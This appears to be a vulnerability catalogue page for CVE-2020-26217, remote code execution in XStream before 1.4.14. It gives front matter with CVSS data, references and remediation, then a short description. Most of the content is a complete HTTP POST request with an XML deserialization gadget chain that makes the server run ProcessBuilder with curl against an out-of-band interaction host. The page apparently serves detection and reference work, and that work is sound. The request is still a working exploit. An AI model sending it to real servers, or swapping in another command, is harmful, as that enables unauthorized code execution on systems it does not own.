---
layout: post
cve_id: CVE-2020-26217
title: XStream <1.4.14 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-26217.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-26217.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pwnhxl,vicrack
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the target system.

  '
remediation: Fixed in 1.4.14.
reference:
- https://x-stream.github.io/CVE-2020-26217.html
- https://github.com/x-stream/xstream/commit/0fec095d534126931c99fd38e9c6d41f5c685c1a
- https://github.com/x-stream/xstream/security/advisories/GHSA-mw36-7c6c-q4q2
- https://nvd.nist.gov/vuln/detail/cve-2020-26217
- https://lists.apache.org/thread.html/r2de526726e7f4db4a7cb91b7355070779f51a84fd985c6529c2f4e9e@%3Cissues.activemq.apache.org%3E
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2020-26217
  cwe-id: CWE-78
  epss-score: 0.93171
  epss-percentile: 0.9978
  cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: xstream_project
  product: xstream
tags:
- cve
- cve2020
- xstream
- deserialization
- rce
- oast
- xstream_project
- vuln
---

## ðŸ” Vulnerability Description
XStream before 1.4.14 is susceptible to remote code execution. An attacker can run arbitrary shell commands by manipulating the processed input stream, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. Users who rely on blocklists are affected.


## ðŸŒ HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.5
Connection: close
Content-Length: 2105
Content-Type: application/xml
Accept-Encoding: gzip
<map>
<entry>
<jdk.nashorn.internal.objects.NativeString>
<flags>0</flags>
<value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
<dataHandler>
<dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
<contentType>text/plain</contentType>
<is class='java.io.SequenceInputStream'>
<e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
<iterator class='javax.imageio.spi.FilterIterator'>
<iter class='java.util.ArrayList$Itr'>
<cursor>0</cursor>
<lastRet>-1</lastRet>
<expectedModCount>1</expectedModCount>
<outer-class>
<java.lang.ProcessBuilder>
<command>
<string>curl</string>
<string>http://d5joq8hle0o44o66gj7gcj96abimjwudy.oast.live</string>
</command>
</java.lang.ProcessBuilder>
</outer-class>
</iter>
<filter class='javax.imageio.ImageIO$ContainsFilter'>
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>start</name>
</filter>
<next/>
</iterator>
<type>KEYS</type>
</e>
<in class='java.io.ByteArrayInputStream'>
<buf></buf>
<pos>0</pos>
<mark>0</mark>
<count>0</count>
</in>
</is>
<consumed>false</consumed>
</dataSource>
<transferFlavors/>
</dataHandler>
<dataLen>0</dataLen>
</value>
</jdk.nashorn.internal.objects.NativeString>
<string>test</string>
</entry>
</map>
```

